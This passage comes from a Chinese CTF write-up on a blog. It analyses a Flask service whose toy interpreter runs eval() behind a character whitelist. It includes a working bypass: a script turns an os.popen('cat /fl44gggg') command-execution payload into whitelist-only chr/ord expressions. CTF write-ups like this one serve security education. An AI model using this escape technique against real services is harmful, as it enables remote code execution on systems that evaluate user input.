 </span><br><span class="line">def <span class="title function_">execute_code</span><span class="params">()</span>:  </span><br><span class="line">    data = request.<span class="type">json</span>  </span><br><span class="line">    <span class="variable">code</span> <span class="operator">=</span> data.get(<span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">    output = executer(code)</span><br><span class="line">    <span class="keyword">return</span> output   </span><br><span class="line"></span><br><span class="line">from contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">from io <span class="keyword">import</span> StringIO</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">StupidInterpreter</span>:  </span><br><span class="line">    def <span class="title function_">__init__</span><span class="params">(self)</span>:  </span><br><span class="line">        self.variables = &#123;&#125;</span><br><span class="line">        </span><br><span class="line">    def <span class="title function_">interpret</span><span class="params">(self, code)</span>:  </span><br><span class="line">        <span class="keyword">if</span> self.checker(code) == False:</span><br><span class="line">            print(<span class="string">&quot;有脏东西！&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">        commands = code.split(<span class="string">&#x27;;&#x27;</span>)  </span><br><span class="line">        <span class="keyword">for</span> command in commands:  </span><br><span class="line">            command = command.strip()  </span><br><span class="line">            <span class="keyword">if</span> command:  </span><br><span class="line">                self.execute_command(command)  </span><br><span class="line">  </span><br><span class="line">    def <span class="title function_">execute_command</span><span class="params">(self, command)</span>:  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> in command:  </span><br><span class="line">            variable, expression = command.split(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)  </span><br><span class="line">            variable = variable.strip()  </span><br><span class="line">            result = self.evaluate_expression(expression.strip())  </span><br><span class="line">            self.variables[variable] = result  </span><br><span class="line">        #执行打印操作</span><br><span class="line">        elif command.startswith(<span class="string">&#x27;cdhor(&#x27;</span>) and command.endswith(<span class="string">&#x27;)&#x27;</span>):</span><br><span class="line">            expression = command[<span class="number">6</span>:-<span class="number">1</span>].strip()  </span><br><span class="line">            result = self.evaluate_expression(expression)  </span><br><span class="line">            print(result)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            print(f<span class="string">&quot;未知指令: &#123;command&#125;&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    def <span class="title function_">evaluate_expression</span><span class="params">(self, expression)</span>:  </span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">var</span>, value in self.variables.items():  </span><br><span class="line">            expression = expression.replace(<span class="keyword">var</span>, str(value))  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            <span class="keyword">return</span> eval(expression, &#123;&#125;, &#123;&#125;)</span><br><span class="line">        except Exception as e:  </span><br><span class="line">            print(f<span class="string">&quot;执行出错: &#123;e&#125;&quot;</span>)  </span><br><span class="line">            <span class="keyword">return</span> None  </span><br><span class="line">                </span><br><span class="line">    def <span class="title function_">checker</span><span class="params">(self, string)</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            string.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        except UnicodeEncodeError:</span><br><span class="line">            <span class="keyword">return</span> <span class="type">False</span> </span><br><span class="line">        <span class="variable">allow_chr</span> <span class="operator">=</span> <span class="string">&#x27;0cdhor+-*/=()&quot;\&#x27;; &#x27;</span></span><br><span class="line">        <span class="keyword">for</span> <span class="type">char</span> in string:  </span><br><span class="line">            <span class="keyword">if</span> <span class="type">char</span> not in allow_chr:  </span><br><span class="line">                <span class="keyword">return</span> False    </span><br><span class="line"></span><br><span class="line">def <span class="title function_">executer</span><span class="params">(code)</span>:</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    interpreter = StupidInterpreter()  </span><br><span class="line">    with <span class="title function_">redirect_stdout</span><span class="params">(outputIO)</span>:</span><br><span class="line">        interpreter.interpret(code)</span><br><span class="line">    output = outputIO.getvalue()</span><br><span class="line">    <span class="keyword">return</span>(output)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    app.run(debug=False)</span><br></pre></td></tr></table></figure>
<p>首先通过白名单绕过</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_chr = <span class="string">&#x27;0cdhor+-*/=()&quot;\&#x27;; &#x27;</span></span><br></pre></td></tr></table></figure>
<p>这里最后会进行执行一个eval函数，而要做的就是将expression来进行拼接为一个能执行的字符串</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> eval(expression, &#123;&#125;, &#123;&#125;)</span><br></pre></td></tr></table></figure>
<p>首先可以用python的两个函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chr() <span class="comment">//通过ascii码转字符</span></span><br><span class="line">ord() <span class="comment">//将字符转ascii码</span></span><br></pre></td></tr></table></figure>
<p>这里就可以拼接出一个数字</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ord(<span class="string">&#x27;*&#x27;</span>)-ord(<span class="string">&#x27;)&#x27;</span>) <span class="comment">//这个是数字 1</span></span><br><span class="line"><span class="comment">//通过+就可以拼凑出一个字符的ascii</span></span><br></pre></td></tr></table></figure>
<p>比如通过python脚本来进行编写就可以得到一个字符得ascii码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;a&#x27;</span></span><br><span class="line"># print(a)</span><br><span class="line">qwe=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in a:</span><br><span class="line">    #print(ord(i))</span><br><span class="line">    d=ord(i)</span><br><span class="line">    s=<span class="string">&quot;ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)&quot;</span></span><br><span class="line">    f=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(f&lt;d):</span><br><span class="line">        s+=<span class="string">&quot;+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)&quot;</span></span><br><span class="line">        f+=<span class="number">1</span></span><br><span class="line">    #print(s)</span><br><span class="line">    qwe=<span class="string">&quot;chr(&quot;</span>+s+<span class="string">&quot;)&quot;</span></span><br><span class="line">print(qwe)</span><br><span class="line"><span class="comment">//chr(ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;))</span></span><br><span class="line">print(eval(qwe)) <span class="comment">//a</span></span><br></pre></td></tr></table></figure>
<p>这里就可以开始分析如何拼接字符串和构造poc链了，这里主要是两个符号来进行执行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> in command:  </span><br><span class="line">    variable, expression = command.split(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)  </span><br><span class="line">    variable = variable.strip()  </span><br><span class="line">    result = self.evaluate_expression(expression.strip())  </span><br><span class="line">    self.variables[variable] = result  </span><br><span class="line">#执行打印操作</span><br><span class="line">elif command.startswith(<span class="string">&#x27;cdhor(&#x27;</span>) and command.endswith(<span class="string">&#x27;)&#x27;</span>):</span><br><span class="line">    expression = command[<span class="number">6</span>:-<span class="number">1</span>].strip()  </span><br><span class="line">    result = self.evaluate_expression(expression)  </span><br><span class="line">    print(result)  </span><br></pre></td></tr></table></figure>
<p>这里首先是可以通过;号来隔开每个不同的命令，而有两个命令执行形式不同，一个为=，另外一个为cdhor()</p>
<p>先去看看 = 号发生了什么，其实就是将等号右边的命令进行执行了，左边的作为新的键名，键值为执行结果，这里就可以大胆的想，这里就可以实现对字符串的拼接，如果将我们poc链需要的字典放到创建的集合中就可以开始拼接字符串</p>
<p>其实关键在执行命令时有一个替换的过程</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="keyword">var</span>, value in self.variables.items():  </span><br><span class="line">    expression = expression.replace(<span class="keyword">var</span>, str(value))</span><br></pre></td></tr></table></figure>
<p>这里如果将字典构建完成后，我们在通过cdhor()来执行拼接的结果就可以绕过，并且执行命令，下面的python脚本就可以开始执行,但是脚本还需要自动进行拼接，还有可能比较长，但是不影响，只是怎么简单怎么来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#首先实现字典的构造，这里构造的qwe前面会多一个;号，去掉即可</span></span><br><span class="line">a=<span class="string">&#x27;&gt;:+asdfghjklqwertyuiopzxcvbnm_[\&#x27;&quot;N]().&#123;&#125;, 0123456789/&#x27;</span></span><br><span class="line">qwe=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="comment">#print(ord(i))</span></span><br><span class="line">    d=<span class="built_in">ord</span>(i)</span><br><span class="line">    s=<span class="string">&quot;ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)&quot;</span></span><br><span class="line">    f=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(f&lt;d):</span><br><span class="line">        s+=<span class="string">&quot;+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)&quot;</span></span><br><span class="line">        f+=<span class="number">1</span></span><br><span class="line">    <span class="comment">#print(s)</span></span><br><span class="line">    ss=<span class="string">&quot;chr(&quot;</span>+s+<span class="string">&quot;)&quot;</span></span><br><span class="line">    dd=ss+<span class="string">&quot;=&quot;</span>+ss</span><br><span class="line">    <span class="comment">#print(ss)</span></span><br><span class="line">    qwe=qwe+<span class="string">&quot;;&quot;</span>+dd</span><br><span class="line"><span class="built_in">print</span>(qwe)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="comment">#下面构造执行命令的payload</span></span><br><span class="line">b=<span class="string">&quot;globals()[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(\&quot;os\&quot;).popen(\&quot;cat /fl44gggg\&quot;).read()&#x27;)&quot;</span></span><br><span class="line">asd=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="comment">#print(ord(i))</span></span><br><span class="line">    d=<span class="built_in">ord</span>(i)</span><br><span class="line">    s=<span class="string">&quot;ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)&quot;</span></span><br><span class="line">    f=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(f&lt;d):</span><br><span class="line">        s+=<span class="string">&quot;+ord(&#x27;*&#x27;)-ord(&#x27;)&#x27;)&quot;</span></span><br><span class="line">        f+=<span class="number">1</span></span><br><span class="line">    <span class="comment">#print(s)</span></span><br><span class="line">    ss=<span class="string">&quot;chr(&quot;</span>+s+<span class="string">&quot;)&quot;</span></span><br><span class="line">    dd=ss+<span class="string">&quot;=&quot;</span>+ss</span><br><span class="line">    <span class="comment">#print(ss)</span></span><br><span class="line">    asd=asd+ss</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;cdhor(&quot;</span>+asd+<span class="string">&quot;)&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>这里需要注意如果直接执行命令就只会输出0或者1,但是我们可以通过ssti的方法通过.read()来让print输出结果</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/ctf/" rel="tag"># ctf</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/11/02/BuildCTF2024/" rel="prev" title="BuildCTF2024">
                  <i class="fa fa-angle-left"></i> BuildCTF2024
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/11/14/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="Shiro反序列化">
                  Shiro反序列化 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">luokuang</span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>




    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
